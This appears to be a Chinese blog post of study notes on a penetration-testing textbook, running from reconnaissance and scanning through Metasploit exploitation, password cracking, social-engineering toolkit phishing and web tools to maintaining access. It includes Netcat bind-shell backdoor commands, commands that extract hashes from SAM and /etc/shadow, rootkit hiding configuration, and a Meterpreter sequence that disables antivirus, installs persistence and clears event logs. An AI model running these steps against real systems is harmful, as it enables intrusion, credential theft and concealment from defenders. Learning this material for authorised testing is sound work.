---
title: 《渗透测试实践指南》笔记
date: 2018-11-11 18:14:07
tags: PENTEST
---

<div align=center>![](/images/penetration_testing.jpg)

完结...很多情况下，作为渗透测试人员，你的工作越出色，别人也就越不会关注或 “ 感受到 ”你的工作。

<!-- more -->

------------------------------------------------------------------------------------------------------------------------------------------

# 一. 侦查
- IP 列表 
- 开源情报
- 主动、被动

## 1. HTTrack
网站复制机 : `httrack`

## 2. Google指令
1. `site:`
2. `intitle:` 
    `alintitle:index of`:web服务器上所有可用的索引目录列表
3. `inurl:admin/login/logan/signin/signon/Forgetpassword/Forget/Reset`:包含某些特定字符网站，发现网站管理或设置页面
4. `cache:`:网页快照
5. `filetype:`

## 3. The Harvester
搜索某网站的电子邮箱、子域名和主机
`theharvester -d target_domin -l _number -b google/LinkedIn/(all)`

## 4. whois
收集与目标网站相关的额外信息：ip、DNS、地址、电话等

## 5. Netcraft
ip、DNS、web服务器操作系统

## 6. host
主机名——ip翻译

## 7. NS lookup、Dig、fierce
DNS服务器中的主机记录

1.NS lookup：
<pre>
nslookup
>server 8.8.8.8
>set type = any / mx(邮件)
>target_domin
</pre>

2.Dig： 
`dig @target_ip -t AXFR(区域传输)`

3.fierce：
`fierce -dns target_domin`

## 8. MetaGooFil
提取元数据
`metagoofil -d target_domin -t pdf/doc... -n _number -o storage_dir -f output_file`

## 9. 其它
有关目标的完整档案
1. [ThreatAgent Drone](https://www.treatagent.com)
2. [FOCA](http://www.informatica64.com/foca.aspx)
3. SearchDiggity
4. [Google黑客数据库（GHDB）](www.hackersforcharity.org/ghdb)
5. **Maltego**
6. **Robertex**

# 二. 扫描

- 端口扫描：namp
- 漏洞扫描:Nessus、OpenVAS
- ip → 端口、服务

## 1. PING

网络连接的可靠性，ICMP，防火墙等设备可能会抑制ping包

`fping -a(只显示活动的主机) -q（静默） -s(显示统计数据) -g target_ip_list > "output_file"`

## 2. Nmap

端口服务扫描器，NetBIOS(137-139)，RDP(3389)，MSSQL(1433)， VNC(5800/5900)

1. `nmap -s/sS -p-(所有端口) -Pn(跳过主机发现) target_ip/-iL ip_list_path `：默认的SYN扫描，只完成三次握手前两步
2. `-sT`：TCP扫描
3. `-sUV`：UDP扫描，非常慢，没有`-p-`和`-Pn`参数 , DHCP（67/68）/DNS/SNMP(161/162)/TFTP(69)都是基于UDP的 
4. `-sX`：Xmas Tree扫描 , SYN和ACK标记未被置位，针对Linux/Unix系统，针对100%针对TCP RFC文档建议的操作系统, 关闭的端口会响应RST数据包，开放的端口会忽略。某些情况可以绕过简单的数据包过滤和访问控制列表（ACLs） 
5. `-sN`：Null扫描 , 同Xmas
6. `-sV`：版本扫描，**尽可能多用**，`-T`：扫描时间，`-O`：操作系统
7. **NSE**：`namp --script banner/vuln target_ip`,  目录（/usr/share/nmap/scripts），端口扫描、漏洞扫描、网络发现、后门检测、漏洞利用··· https://nmap.org/nsedoc/

## 3. Nessus、OpenVAS

漏洞扫描

# 三. 漏洞利用

## 1. 在线密码破解

- **Medusa、Hydra**
- 获取远程服务访问权限
- 密码列表：①RockYou(/usr/share/wordlists)、②John the Riper(jtr)（/usr/share/john/password.lst）

`medusa -h target_ip -u/U _username -p/P password -M target_service`

## 2. 漏洞利用框架

- **Metasploit**
- 漏洞攻击程序、攻击载荷
- `msfconsole`：启动Metasploit
- `msfupdate`：升级Metasploit

<pre>
msf> search missing_patch_number(or CVE)/year ：搜索漏洞攻击程序
msf> use exploit_path ：选择漏洞攻击程序
msf> show payloads ：显示可用的攻击载荷
msf> set payload payload_path ：选择攻击载荷
msf> show options ：显示需要配置的选项
msf> set option_name : 配置选项
msf> exploit ：发动漏洞攻击
</pre>

### 攻击载荷：VNC、Meterpreter☆...

- **Meterpreter：**完全在内存中运行，强大的命令行shell，migrate ...

## 3. 离线密码破解

- John the Ripper
- 获取密码散列（hash），将密码散列转化为明文
- `john --test`：基准衡量，每秒破解次数（c/s）

### 1）本地密码破解（windows）：

- SAM（安全账号管理器）   

#### 步骤：  

1. 启动Live CD  
2. `mkdir /mnt/sda1`：创建一个挂载点  
   `fdisk -l`：查看本地可用驱动器  
   `mount /dev/sda1 /mnt/sda1`：挂载包含SAM文件的驱动器
3. `cd /mnt/sda1/Windows/system32/config`：进入包含SAM的文件夹
4. `ls`：定位SAM文件及system文件
5. `samdump2 system SAM > /tmp/hashes.txt`：利用SamDump2工具提取散列  
   `bkhive system sys_key.txt`,`samdump2 SAM sys_key.txt > /tmp/hash.txt`：有时需要先利用Bkhive工具提取系统秘钥
6. `john /tmp/hashes.txt --format = nt`：利用JtR破解密码，`--format = nt`指定了密码散列类型为NTLM

### 2）远程密码破解（windows）：

#### 步骤：

1. 对远程目标系统发动Meterpreter攻击载荷的漏洞攻击
2. `meterpreter > hashdump`：在meterpreter shell中提取远程目标系统密码散列
3. 利用JtR破解密码

### 3）Linux密码破解：

- 密码散列包含在‘/etc/shadow’文件里
- `unshadow /etc/passwd /etc/shadow > /tmp/linux_hashes.txt`：利用JtR的特殊功能合并'/etc/shadow'文件和‘/etc/passwd’文件，输出包含原始散列的列表
- 使用能够破解SHA散列的JtRb版本破解密码

## 4. 密码重置

1. 获取目标系统物理访问权限
2. 启动kali live CD
3. 挂载包含SAM文件的驱动器
4. `chntpw -h`：查看`chntpw`命令的参数及选项
5. `chntpw -i /mnt/sda1/WINDOWS/system32/config/SAM`：以交互模式运行`chntpw`程序

## 5. 网络流量嗅探：Dsniff、Wireshark

1. 将网卡设置为“混杂模式”
2. `macof -i eth0 -s source_ip -d target_ip`：利用Dsniff中的一个工具Macof生成几千个随机MAC地址对交换机进行泛洪攻击，强迫交换机按集线器的工作方式运行
3. `wireshark`：网络流量过滤分析

## 6. Armitige：一站式漏洞利用工具

- 在Metasploit上运行、GUI驱动的前端程序
- “Haly Mary”功能：根据端口扫描信息，发动所有可能匹配的漏洞攻击

## 7. 其他高级漏洞利用工具

1. Medusa、Hydra：密码破解、获取远程服务权限
2. RainbowCrack：利用彩虹表（Rainbow table）对密码进行破解,预先计算好密码散列
3. Dsniff、Wireshark、Tcpdump
4. Ettercap：中间人攻击
5. Exploit-DB：漏洞利用和POC代码的公开知识库

# 四. 社会工程（SET）

- 用于社会工程的漏洞利用框架，快速创建高级攻击向量
- 菜单驱动，配置文件：/usr/share/setoolkit/config/set_config
- 运行之前一定要更新

`se-toolkit`：启动SET主界面

## 社会工程菜单下的内容

1. Spear-Phishing Attack Vectors：钓鱼式攻击，制作包含恶意附件的电子邮件
2. Website Attack Vectors：网站攻击向量
3. Infectious Media Generator：生成带有恶意攻击载荷的U盘
4. Create a Payload and Listener：前提已经能够访问目标系统，希望部署更隐蔽的SET载荷，更好地避开防病毒产品
5. Mass Mailer Attack：发送大量邮件
6. Arduino-Based Attack Vector☆：将“Teensy”设备编程为键盘，绕过自动运行，模拟键盘并在目标设备上打开一个后门，获得完整Meterpreter Shell
7. SMS Spoofing Attack Vector：伪造短信
8. Wireless Access Point Attack Vector：创建伪Wifi站点，重定向
9. QRcode Generator Attack Vector：创建重定向二维码
10. Powershell Attack Vectors：生成一系列可以在控制系统之后执行的Powershell攻击代码，可以绕过执行限制策略

## "Website Attack Vectors"菜单下的内容  

1. 1)Java Applet Attack Method：Java小脚本攻击
2. 3)Credential Harvester Attack Method：凭据采集者
3. 7)Muti-Attack Web Method：多重攻击向量

### 1) Java小脚本攻击：

向网页注入恶意脚本，安装Web服务器，创建攻击载荷

#### 步骤：

1. `Site Cloner`：克隆网页
2. `15)PyInjector shellcode Injetion`：直接向内存注入shellcode，不需要接触磁盘，能够完全骗过防病毒产品，类似Meterpreter
3. 指定回连端口，选择攻击载荷，通常选`Windows Meterpreter reverse TCP payload`
4. 发送恶意链接，等待获取Shell

### 3) 凭据采集者：

针对用户可能输入用户名密码的可信站点

#### 步骤：

1. `Site Cloner`：克隆网站
2. 指定回连IP，发送恶意链接，等待捕捉用户凭据  

# 五. 基于Web的漏洞利用

## 1. Nikto

Web服务器漏洞扫描工具  
`nikto`：查看Nikto的各种选项设置  
`nikto -h target_ip -p _port -o storage_file_path`

## 2. W3AF

Web资源扫描和漏洞利用工具，提供了易用的界面  
`w3af`：启动W3AF

## 3. WebScarab

web代理框架，本质是模块化，允许用户加载大量的插件以满足定制的需要

- `webscarab`：启动WebScarab  
- 把WebScarab配置为代理服务器

1. 网络爬虫：`"Use full-featured interface"`  
2. 拦截请求：`"Use Lite Interface"`

## 4. Zed Attack Proxy（ZAP）

全功能Web入侵工具包，拦截代理、爬虫和漏洞扫描（漏洞扫描程序和Nessus很相似，加载了已知漏洞的特征，扫描程序的好坏取决于所包含的特征）  

- `zap`：启动ZAP  
- 配置浏览器使用代理，端口号8080

## 5. 其他相关

1. 脆弱平台：WebGoat、Damn Vulnerable Web App（DVWA）
2. 开放Web应用程序安全项目（OWASP）：Web安全真正的领袖，OWASP Top Ten项目
3. 其他代理：WebScarab、Burp Proxy、Paros Proxy
4. Burp Suite：当前最出色的Web应用测试工具

# 六. 维持访问

后门、隐藏、迁移shell

## 1. Netcat：瑞士军刀

- 允许通信和网络流量从一台计算机流向另一台计算机的工具
- 后门的最佳选择、传递文件、端口扫描、即时消息、搭建Web服务器
- 服务器、客户端

### 1）配置为连接两台计算机的通信通道

- 服务器：`nc -l(置为监听模式) -p _port`  
- 客户端：`nc server_ip _port`

##### 保持连接持久性：

- windows：①用`-L`参数，②添加注册表自启动
- Linux：通过写bash脚本让Netcat在初始连接关闭时重新启动

### 2）文件传输

#### 上传/下载：

- 服务器：`nc -l -p _port > virus.exe`  
- 客户端：`nc server_ip _port < virus.exe`
- 下载时以攻击机作为服务器

### 3）识别端口服务

- `nc server_ip unknown_port`：强制Netcat试图连接到未知服务，`-u` 参数发送UDP数据包
- 输入文本传递给目标服务，等待回应

### 4）绑定进程，配置后门

- `nc -l -p _port -e /bin/sh`：Linux
- `nc -L -p _port -e c:\Windows\System32\cmd.exe`：Windows

## 2. Cryptcat

对Netcat客户端和服务器端的流量进行加密

- 使用`-k`参数更改默认的Key值metallica  
- 服务器：`cryptcat -l -p _port`
- 客户端：`cryptcat server_ip _port`

## 3. Rootkit

隐藏文件、进程、程序，保持后门访问的隐蔽性，躲过即使是最强大的杀毒软件的查杀，通过“挂钩（hooking）”或拦截软件与操作系统之间的各种请求

### Hacker Defender（Windows Rootkit）

一个Windows Rootkit

#### 三个主要文件：

- hxdef100.exe：可执行文件，目标计算机上运行Hacker Defender
- hxdef100.ini：配置文件
- bdcli100.exe：客户端软件，连接Hacker Defender的后门

#### hxdef100.ini：

- [Hidden Table]：对Windows资源管理器和文件管理器是隐藏的
- [Hidden Processes]：对用户隐藏的进程或程序，无法在任务管理器中看到
- [Root Processes]：可以用来交互的程序以及可以查看到的但在之前已经隐藏了的文件夹和进程
- [Hidden Service]：隐藏所有以服务的方式安装或运行的程序，无法再任务管理器中看到
- [Hidden Regkeys]：隐藏特定的注册表键
- [Hidden RegValues]：隐藏注册表键值
- [Startup Run]：在Hacker Defender启动之后自动运行的程序，放置后门程序，如Natcat命令并确保Netcat运行在监听模式
- [Free Space]：强制将已经使用的磁盘空间“加回到”可用磁盘空间中
- [Hidden Port]：隐藏端口，进一步被细分为TCPI、TCPO、UDP子节

#### 发现隐藏文件和Rootkit的工具：

- Rootkit Revealer、vice、F-Secure的Blacklight

## 4. Meterpreter

一个无所不能的Metasploit攻击载荷，包含一些列內建命令，使攻击者快速轻松从“漏洞利用”阶段转向“漏洞利用后”阶段

### 步骤：

1. 进行漏洞利用，对目标使用Meterpreter攻击载荷
2. 使用“migrate”命令将Meterpreter转移到不为人熟知的常见进程中，如服务主机（svchost.exe）
3. “kill”命令禁用防病毒软件
4. “shell”命令访问目标系统命令提示符，使用“netsh advfirewall firewall”命令更改Windows防火墙设置（使连接或端口开放）
5. 使用“upload”命令上传Rootkit、nmap、Metasploit、John the Ripper等工具包
6. “execute -f”命令安装rootkit
7. 若rootkit没有包含后门，用“execute -f”安装Netcat作为永久后门
8. “reg”命令修改注册表，使Netcat持久化
9. “hashdump”命令转储密码散列，使用jtr破解密码
10. “edit”命令配置rootkit.ini文件，隐藏上传的文件、后门、新打开的端口
11. 从攻击机器建立到目标的新连接，测试上传的后门
12. “clearev”命令清除事件日志
13. 攻击下一个目标 

## 5. 其他

Ncat、Socat：Netcat的高级工具
Netbus、Back Orifice、Subseven(Sub7)：后门

**一些资源：**

1. [Metasploitable : 一个有漏洞的Ubuntu](http://sourceforge.net/projects/Metasploitable)
2. [渗透测试执行标准（PTES）](http://www.pentest-standard.org)
3. [EXPLOIT DATABASE](https://www.exploit-db.com/)

